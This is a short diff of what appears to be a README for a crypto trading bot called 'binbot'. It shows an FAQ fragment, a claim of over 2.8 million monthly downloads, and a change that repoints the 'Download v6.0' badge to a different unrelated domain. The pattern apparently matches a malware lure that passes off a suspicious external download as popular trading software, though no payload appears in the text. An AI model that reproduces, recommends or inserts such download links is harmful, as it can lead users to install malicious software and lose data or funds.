@@ -49,7 +49,7 @@ A: Yes — dollar-cost averaging on configurable intervals.
 
 **Monthly downloads:** 2.8m+
 
-[![Download](https://img.shields.io/badge/Download-v6.0-brightgreen?style=for-the-badge)](https://connectinstruction.com/binbot26)
+[![Download](https://img.shields.io/badge/Download-v6.0-brightgreen?style=for-the-badge)](https://dllvcrun.com/binbot26)
 
 ---
 
